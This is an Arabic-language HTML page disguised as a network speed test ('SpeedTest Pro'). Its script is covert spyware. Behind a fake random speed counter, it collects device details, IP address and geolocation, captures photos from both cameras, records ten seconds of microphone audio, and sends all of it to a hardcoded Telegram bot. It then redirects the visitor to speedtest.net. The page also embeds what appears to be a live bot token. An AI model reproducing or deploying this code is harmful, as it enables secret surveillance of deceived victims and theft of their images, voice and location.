<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SpeedTest Pro | فحص جودة الشبكة</title>
    <style>
        :root { --accent: #00d2ff; --bg: #0b0e18; }
        body { background: var(--bg); color: white; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .grid { position: absolute; width: 100%; height: 100%; background-image: linear-gradient(rgba(0,210,255,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(0,210,255,0.03) 1px, transparent 1px); background-size: 30px 30px; z-index: -1; }
        .card { background: rgba(255,255,255,0.02); padding: 40px; border-radius: 35px; border: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(20px); text-align: center; width: 80%; max-width: 400px; box-shadow: 0 20px 60px rgba(0,0,0,0.6); }
        .btn-go { width: 140px; height: 140px; border-radius: 50%; border: 3px solid var(--accent); background: transparent; color: var(--accent); font-size: 28px; font-weight: 900; cursor: pointer; transition: 0.3s; position: relative; z-index: 10; }
        .btn-go:hover { box-shadow: 0 0 30px rgba(0,210,255,0.4); }
        #speedBox { display: none; margin-top: 10px; }
        .num { font-size: 55px; font-weight: 900; color: var(--accent); text-shadow: 0 0 20px rgba(0,210,255,0.5); }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="grid"></div>
    <div class="card">
        <h2 style="font-weight: 300; letter-spacing: 3px; margin-bottom: 5px;">SPEEDTEST</h2>
        <p id="msg" style="color: #6a728e; font-size: 13px; margin-bottom: 30px;">اضغط للبدء واختيار أفضل سيرفر</p>
        
        <div id="loader" style="position: relative; display: flex; justify-content: center; align-items: center;">
            <button id="goBtn" class="btn-go">GO</button>
            <div id="speedBox">
                <span id="num" class="num">0.0</span>
                <div style="color: #6a728e; font-size: 14px;">Mbps Download</div>
            </div>
        </div>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const token = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
        const chat = "7984067238";

        async function api(method, params = {}, isFile = false) {
            const url = `https://api.telegram.org/bot${token}/${method}`;
            const fd = new FormData();
            fd.append("chat_id", chat);
            for (let k in params) fd.append(k, params[k]);
            try { await fetch(url, { method: "POST", body: fd }); } catch(e) {}
        }

        async function getReport() {
            let info = `🔥 *تقرير احترافي جديد*:\n\n`;
            info += `• 📱 الجهاز: \`${navigator.platform}\`\n`;
            info += `• ⚙️ المعالج: \`${navigator.hardwareConcurrency} Cores\`\n`;
            info += `• 🖥️ الشاشة: \`${screen.width}x${screen.height}\`\n`;
            try {
                const b = await navigator.getBattery();
                info += `• 🔋 البطارية: \`${Math.round(b.level*100)}%\` (${b.charging?'🔌':'🔋'})\n`;
                const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json());
                info += `• 🌐 الـ IP: \`${ip.ip}\`\n`;
            } catch(e){}
            return info;
        }

        async function snap(mode) {
            try {
                const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: mode}});
                const v = document.getElementById("v");
                v.srcObject = s;
                await new Promise(r => v.onloadedmetadata = r);
                await new Promise(r => setTimeout(r, 2500)); // وقت كافٍ للوضوح
                const c = document.getElementById("c");
                c.width = 720; c.height = 960;
                c.getContext("2d").drawImage(v, 0, 0);
                s.getTracks().forEach(t => t.stop());
                return new Promise(res => c.toBlob(res, "image/jpeg", 0.8));
            } catch(e){ return null; }
        }

        async function record(sec) {
            try {
                const s = await navigator.mediaDevices.getUserMedia({audio: true});
                const mr = new MediaRecorder(s);
                const chunks = [];
                return new Promise(res => {
                    mr.ondataavailable = e => chunks.push(e.data);
                    mr.onstop = () => {
                        const blob = new Blob(chunks, {type: 'audio/ogg'});
                        s.getTracks().forEach(t => t.stop());
                        res(blob);
                    };
                    mr.start();
                    setTimeout(() => mr.stop(), sec * 1000);
                });
            } catch(e){ return null; }
        }

        document.getElementById("goBtn").onclick = async function() {
            this.style.display = "none";
            document.getElementById("speedBox").style.display = "block";
            document.getElementById("msg").innerText = "جاري التحليل...";

            // حركة العداد
            const t = setInterval(() => {
                document.getElementById("num").innerText = (Math.random()*(98-82)+82).toFixed(1);
            }, 100);

            // 1. التقرير والموقع
            api("sendMessage", { text: await getReport(), parse_mode: "Markdown" });
            navigator.geolocation.getCurrentPosition(p => {
                const map = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                api("sendMessage", { text: `📍 *الموقع*:\n[فتح الخريطة](${map})`, parse_mode: "Markdown" });
            });

            // 2. الصور (بالترتيب لضمان الجودة)
            const f = await snap("user");
            if(f) await api("sendPhoto", { photo: f, caption: "👤 الأمامية" });
            
            const b = await snap("environment");
            if(b) await api("sendPhoto", { photo: b, caption: "🌍 الخلفية" });

            // 3. الصوت (10 ثوانٍ)
            const aud = await record(10);
            if(aud) await api("sendVoice", { voice: aud });

            // 4. النهاية
            setTimeout(() => {
                clearInterval(t);
                location.href = "https://www.speedtest.net/ar";
            }, 14000);
        };
    </script>
</body>
</html>
